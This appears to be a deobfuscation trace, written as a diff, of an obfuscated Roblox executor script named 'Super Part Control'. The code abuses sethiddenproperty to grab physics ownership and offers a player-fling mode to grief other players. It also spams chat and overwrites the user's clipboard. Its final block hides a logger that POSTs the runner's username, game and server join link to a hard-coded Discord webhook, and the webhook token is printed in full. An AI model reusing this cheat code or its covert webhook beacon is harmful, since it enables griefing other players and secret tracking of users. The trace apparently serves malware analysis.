@@ -1,0 +1,396 @@
+-- Behaviour trace of a Unknown obfuscator script
+-- NOTE: reconstructed from observed behaviour; branches that were not taken
+--       during the trace are missing and conditions are only noted in comments.
+-- run status: script error: Ironbrew VM Error: 
+--   Ironbrew VM Error: 
+--   Script:1: attempt to compare number <= userdata
+--   /tmp/deobf_5aqc1k8y/in.deobf.luau.harness.luau:6415
+--   Script:1 function y
+--   Script:1
+--   Script:1
+--   Script:1
+--   /tmp/deobf_5aqc1k8y/in.deobf.luau.harness.luau:6429
+--   
+-- 334 statements recorded in 0.19s
+-- remotes fired/invoked:
+--   DefaultChatSystemChatEvents.SayMessageRequest
+-- non-standard globals touched: _ENV, syn, sethiddenproperty
+
+-- [deobf] folded 0 repeated calls into 0 helper functions and 5 unrolled runs into loops
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui", 10)
+local SuperRingPartsGUI = PlayerGui:FindFirstChild("SuperRingPartsGUI")
+SuperRingPartsGUI:Destroy()
+local CoreGui = game:GetService("CoreGui")
+local SuperRingPartsGUI2 = CoreGui:FindFirstChild("SuperRingPartsGUI")
+SuperRingPartsGUI2:Destroy()
+local ShadowHawkFlingGUI = PlayerGui:FindFirstChild("ShadowHawkFlingGUI")
+ShadowHawkFlingGUI:Destroy()
+local ShadowHawkFlingGUI2 = CoreGui:FindFirstChild("ShadowHawkFlingGUI")
+ShadowHawkFlingGUI2:Destroy()
+getgenv()._ShadowHawkFling = { Active = false, Alive = true, Parts = {} }
+Players.LocalPlayer.ReplicationFocus = workspace
+
+local connection = RunService.Heartbeat:Connect(function(deltaTime)
+	sethiddenproperty(Players.LocalPlayer, "SimulationRadius", math.huge)
+end)
+
+getgenv()._RingOwnershipConn = connection
+local Sound = Instance.new("Sound")
+Sound.SoundId = "rbxassetid://2865227271"
+Sound.Parent = SoundService
+Sound:Play()
+
+Sound.Ended:Connect(function()
+	Sound:Destroy()
+end)
+
+local descendants = workspace:GetDescendants()
+
+for i, v in ipairs(descendants) do
+end
+
+workspace.DescendantAdded:Connect(function(descendant)
+end)
+
+workspace.DescendantRemoving:Connect(function(descendant2)
+end)
+
+RunService.Heartbeat:Connect(function(deltaTime2)
+end)
+
+RunService.Heartbeat:Connect(function(deltaTime3)
+end)
+
+local SuperRingPartsGUI3 = Instance.new("ScreenGui")
+SuperRingPartsGUI3.Name = "SuperRingPartsGUI"
+SuperRingPartsGUI3.ResetOnSpawn = false
+SuperRingPartsGUI3.Parent = PlayerGui
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 220, 0, 365)
+Frame.Position = UDim2.new(0, 10, 0.5, -182)
+Frame.BackgroundColor3 = Color3.fromRGB(204, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Parent = SuperRingPartsGUI3
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = Frame
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Size = UDim2.new(1, 0, 0, 40)
+TextLabel.Text = "Super Part Control"
+TextLabel.TextColor3 = Color3.fromRGB(153, 0, 0)
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 51, 51)
+TextLabel.Font = Enum.Font.Fondamento
+TextLabel.TextSize = 22
+TextLabel.Parent = Frame
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 20)
+UICorner2.Parent = TextLabel
+local TextButton = Instance.new("TextButton")
+TextButton.Size = UDim2.new(0.8, 0, 0, 30)
+TextButton.Position = UDim2.new(0.1, 0, 0, 48)
+TextButton.Text = "Ring Parts Off"
+TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Font = Enum.Font.Fondamento
+TextButton.TextSize = 18
+TextButton.Parent = Frame
+local UICorner3 = Instance.new("UICorner", TextButton)
+UICorner3.CornerRadius = UDim.new(0, 10)
+local TextButton2 = Instance.new("TextButton")
+TextButton2.Size = UDim2.new(0.2, 0, 0, 30)
+TextButton2.Position = UDim2.new(0.1, 0, 0, 85)
+TextButton2.Text = "<"
+TextButton2.BackgroundColor3 = Color3.fromRGB(255, 153, 153)
+TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton2.Font = Enum.Font.Fondamento
+TextButton2.TextSize = 18
+TextButton2.Parent = Frame
+local UICorner4 = Instance.new("UICorner", TextButton2)
+UICorner4.CornerRadius = UDim.new(0, 10)
+local TextButton3 = Instance.new("TextButton")
+TextButton3.Size = UDim2.new(0.2, 0, 0, 30)
+TextButton3.Position = UDim2.new(0.7, 0, 0, 85)
+TextButton3.Text = ">"
+TextButton3.BackgroundColor3 = Color3.fromRGB(255, 153, 153)
+TextButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton3.Font = Enum.Font.Fondamento
+TextButton3.TextSize = 18
+TextButton3.Parent = Frame
+local UICorner5 = Instance.new("UICorner", TextButton3)
+UICorner5.CornerRadius = UDim.new(0, 10)
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(0.4, 0, 0, 30)
+TextBox.Position = UDim2.new(0.3, 0, 0, 85)
+TextBox.Text = "Radius: 50"
+TextBox.ClearTextOnFocus = false
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Font = Enum.Font.Fondamento
+TextBox.TextSize = 16
+TextBox.Parent = Frame
+local UICorner6 = Instance.new("UICorner", TextBox)
+UICorner6.CornerRadius = UDim.new(0, 10)
+local TextLabel2 = Instance.new("TextLabel")
+TextLabel2.Size = UDim2.new(0.8, 0, 0, 18)
+TextLabel2.Position = UDim2.new(0.1, 0, 0, 120)
+TextLabel2.Text = "Speed"
+TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Font = Enum.Font.Fondamento
+TextLabel2.TextSize = 16
+TextLabel2.Parent = Frame
+local TextButton4 = Instance.new("TextButton")
+TextButton4.Size = UDim2.new(0.2, 0, 0, 30)
+TextButton4.Position = UDim2.new(0.1, 0, 0, 140)
+TextButton4.Text = "-"
+TextButton4.BackgroundColor3 = Color3.fromRGB(255, 153, 153)
+TextButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton4.Font = Enum.Font.Fondamento
+TextButton4.TextSize = 18
+TextButton4.Parent = Frame
+local UICorner7 = Instance.new("UICorner", TextButton4)
+UICorner7.CornerRadius = UDim.new(0, 10)
+local TextButton5 = Instance.new("TextButton")
+TextButton5.Size = UDim2.new(0.2, 0, 0, 30)
+TextButton5.Position = UDim2.new(0.7, 0, 0, 140)
+TextButton5.Text = "+"
+TextButton5.BackgroundColor3 = Color3.fromRGB(255, 153, 153)
+TextButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton5.Font = Enum.Font.Fondamento
+TextButton5.TextSize = 18
+TextButton5.Parent = Frame
+local UICorner8 = Instance.new("UICorner", TextButton5)
+UICorner8.CornerRadius = UDim.new(0, 10)
+local TextBox2 = Instance.new("TextBox")
+TextBox2.Size = UDim2.new(0.4, 0, 0, 30)
+TextBox2.Position = UDim2.new(0.3, 0, 0, 140)
+TextBox2.Text = "1"
+TextBox2.ClearTextOnFocus = false
+TextBox2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextBox2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox2.Font = Enum.Font.Fondamento
+TextBox2.TextSize = 18
+TextBox2.Parent = Frame
+local UICorner9 = Instance.new("UICorner", TextBox2)
+UICorner9.CornerRadius = UDim.new(0, 10)
+local TextButton6 = Instance.new("TextButton")
+TextButton6.Size = UDim2.new(0.38, 0, 0, 30)
+TextButton6.Position = UDim2.new(0.1, 0, 0, 180)
+TextButton6.Text = "Normal Orbit"
+TextButton6.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton6.Font = Enum.Font.Fondamento
+TextButton6.TextSize = 13
+TextButton6.Parent = Frame
+local UICorner10 = Instance.new("UICorner", TextButton6)
+UICorner10.CornerRadius = UDim.new(0, 10)
+local TextButton7 = Instance.new("TextButton")
+TextButton7.Size = UDim2.new(0.38, 0, 0, 30)
+TextButton7.Position = UDim2.new(0.52, 0, 0, 180)
+TextButton7.Text = "Chaotic Orbit"
+TextButton7.BackgroundColor3 = Color3.fromRGB(160, 82, 45)
+TextButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton7.Font = Enum.Font.Fondamento
+TextButton7.TextSize = 13
+TextButton7.Parent = Frame
+local UICorner11 = Instance.new("UICorner", TextButton7)
+UICorner11.CornerRadius = UDim.new(0, 10)
+local TextButton8 = Instance.new("TextButton")
+TextButton8.Size = UDim2.new(0.8, 0, 0, 30)
+TextButton8.Position = UDim2.new(0.1, 0, 0, 218)
+TextButton8.Text = "Target Orbit (Fling Players)"
+TextButton8.BackgroundColor3 = Color3.fromRGB(160, 82, 45)
+TextButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton8.Font = Enum.Font.Fondamento
+TextButton8.TextSize = 14
+TextButton8.Parent = Frame
+local UICorner12 = Instance.new("UICorner", TextButton8)
+UICorner12.CornerRadius = UDim.new(0, 10)
+local TextButton9 = Instance.new("TextButton")
+TextButton9.Size = UDim2.new(0.8, 0, 0, 30)
+TextButton9.Position = UDim2.new(0.1, 0, 0, 256)
+TextButton9.Text = "Spin Mode Off"
+TextButton9.BackgroundColor3 = Color3.fromRGB(160, 82, 45)
+TextButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton9.Font = Enum.Font.Fondamento
+TextButton9.TextSize = 14
+TextButton9.Parent = Frame
+local UICorner13 = Instance.new("UICorner", TextButton9)
+UICorner13.CornerRadius = UDim.new(0, 10)
+local TextLabel3 = Instance.new("TextLabel")
+TextLabel3.Size = UDim2.new(1, 0, 0, 20)
+TextLabel3.Position = UDim2.new(0, 0, 1, -22)
+TextLabel3.Text = "Super Part Control by When6omamah"
+TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Font = Enum.Font.Fondamento
+TextLabel3.TextSize = 14
+TextLabel3.Parent = Frame
+local TextButton10 = Instance.new("TextButton")
+TextButton10.Size = UDim2.new(0, 30, 0, 30)
+TextButton10.Position = UDim2.new(1, -35, 0, 5)
+TextButton10.Text = "-"
+TextButton10.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton10.Font = Enum.Font.Fondamento
+TextButton10.TextSize = 18
+TextButton10.Parent = Frame
+local UICorner14 = Instance.new("UICorner", TextButton10)
+UICorner14.CornerRadius = UDim.new(0, 15)
+
+Frame.InputBegan:Connect(function(input, gameProcessed)
+end)
+
+Frame.InputChanged:Connect(function(input2, gameProcessed2)
+end)
+
+UserInputService.InputChanged:Connect(function(input3, gameProcessed3)
+end)
+
+TextButton10.MouseButton1Click:Connect(function()
+	Frame:TweenSize(UDim2.new(0, 220, 0, 40), "Out", "Quad", 0.3, true)
+	TextButton10.Text = "+"
+
+	for _, textButton in ipairs({
+		TextButton, TextButton2, TextButton3, TextBox, TextLabel2, TextButton4, TextButton5,
+		TextBox2, TextButton6, TextButton7, TextButton8, TextButton9, TextLabel3,
+	}) do
+		textButton.Visible = false
+	end
+
+	local Sound2 = Instance.new("Sound")
+	Sound2.SoundId = "rbxassetid://12221967"
+	Sound2.Parent = SoundService
+	Sound2:Play()
+
+	Sound2.Ended:Connect(function()
+		Sound2:Destroy()
+	end)
+end)
+
+for _, item in ipairs({
+	{ textButton = TextButton, text2 = "Ring Parts On" },
+	{ textButton = TextButton9, text2 = "Spin Mode On" },
+}) do
+	item.textButton.MouseButton1Click:Connect(function()
+		item.textButton.Text = item.text2
+		item.textButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+		local Sound3 = Instance.new("Sound")
+		Sound3.SoundId = "rbxassetid://12221967"
+		Sound3.Parent = SoundService
+		Sound3:Play()
+
+		Sound3.Ended:Connect(function()
+			Sound3:Destroy()
+		end)
+	end)
+end
+
+for _, item in ipairs({
+	{ textButton = TextButton2, textBoxText = "Radius: 48" },
+	{ textButton = TextButton3, textBoxText = "Radius: 50" },
+}) do
+	item.textButton.MouseButton1Click:Connect(function()
+		TextBox.Text = item.textBoxText
+		local Sound5 = Instance.new("Sound")
+		Sound5.SoundId = "rbxassetid://12221967"
+		Sound5.Parent = SoundService
+		Sound5:Play()
+
+		Sound5.Ended:Connect(function()
+			Sound5:Destroy()
+		end)
+	end)
+end
+
+TextBox.FocusLost:Connect(function(enterPressed, inputObject)
+	TextBox.Text = "Radius: 50"
+end)
+
+for _, item in ipairs({
+	{ textButton = TextButton4, textBoxText = "0" },
+	{ textButton = TextButton5, textBoxText = "1" },
+}) do
+	item.textButton.MouseButton1Click:Connect(function()
+		TextBox2.Text = item.textBoxText
+		local Sound7 = Instance.new("Sound")
+		Sound7.SoundId = "rbxassetid://12221967"
+		Sound7.Parent = SoundService
+		Sound7:Play()
+
+		Sound7.Ended:Connect(function()
+			Sound7:Destroy()
+		end)
+	end)
+end
+
+TextBox2.FocusLost:Connect(function(enterPressed2, inputObject2)
+end)
+
+for _, item in ipairs({
+	{ textButton = TextButton6, textBoxText = "Radius: 50", r = 50, g = 205, b = 50, r2 = 160, g2 = 82, b2 = 45, r3 = 160, g3 = 82, b3 = 45 },
+	{ textButton = TextButton7, textBoxText = "Radius: 50", r = 160, g = 82, b = 45, r2 = 255, g2 = 69, b2 = 0, r3 = 160, g3 = 82, b3 = 45 },
+	{ textButton = TextButton8, textBoxText = "Radius: 0", r = 160, g = 82, b = 45, r2 = 160, g2 = 82, b2 = 45, r3 = 255, g3 = 0, b3 = 0 },
+}) do
+	item.textButton.MouseButton1Click:Connect(function()
+		TextBox.Text = item.textBoxText
+		TextButton6.BackgroundColor3 = Color3.fromRGB(item.r, item.g, item.b)
+		TextButton7.BackgroundColor3 = Color3.fromRGB(item.r2, item.g2, item.b2)
+		TextButton8.BackgroundColor3 = Color3.fromRGB(item.r3, item.g3, item.b3)
+		local Sound9 = Instance.new("Sound")
+		Sound9.SoundId = "rbxassetid://12221967"
+		Sound9.Parent = SoundService
+		Sound9:Play()
+
+		Sound9.Ended:Connect(function()
+			Sound9:Destroy()
+		end)
+	end)
+end
+
+task.spawn(function()
+	local userIdFromNameAsync = Players:GetUserIdFromNameAsync("When6omamah")
+	local userThumbnailAsync = Players:GetUserThumbnailAsync(userIdFromNameAsync, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+	StarterGui:SetCore("SendNotification", { Text = "enjoy!!", Title = "Made by @When6omamah", Duration = 10, Icon = userThumbnailAsync })
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local DefaultChatSystemChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+	DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+	DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Super Part Control by When6omamah", "All")
+end)
+
+setclipboard("https://www.roblox.com/users/10707514856/profile")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local productInfo = MarketplaceService:GetProductInfo(0)
+
+local json = HttpService:JSONEncode({
+	embeds = {
+		{
+			color = 3092695,
+			fields = {
+				{ inline = false, name = "Player", value = "" .. Players.LocalPlayer.DisplayName .. " @" .. Players.LocalPlayer.Name .. "\nID: " .. "0" },
+				{ inline = true, name = "Game", value = productInfo.Name },
+				{ inline = true, name = "Status", value = "Inside" },
+				{ inline = false, name = "Join Link", value = "roblox://experiences/start?placeId=0&gameInstanceId=" .. tostring(game.JobId) }
+			},
+			footer = { text = "Place ID: 0 | Job ID: " .. tostring(game.JobId) },
+			thumbnail = { url = "https://assetdelivery.roblox.com/v1/asset/?id=" .. tostring(productInfo.IconImageAssetId) },
+			timestamp = "2026-10-28T01:45:09Z",
+			title = "Control Parts Script Executed"
+		}
+	},
+	username = "Logger"
+})
+
+syn.request({
+	Body = json,
+	Headers = { ["Content-Type"] = "application/json" },
+	Method = "POST",
+	Url = "https://discord.com/api/webhooks/1548173482108526663/ZkADERx-j_HRD7fRgx0MIvhSp3mCqPy_0lsSL7XUGBxD2Autlyv2G_6iCot7g7EJjRAo"
+})
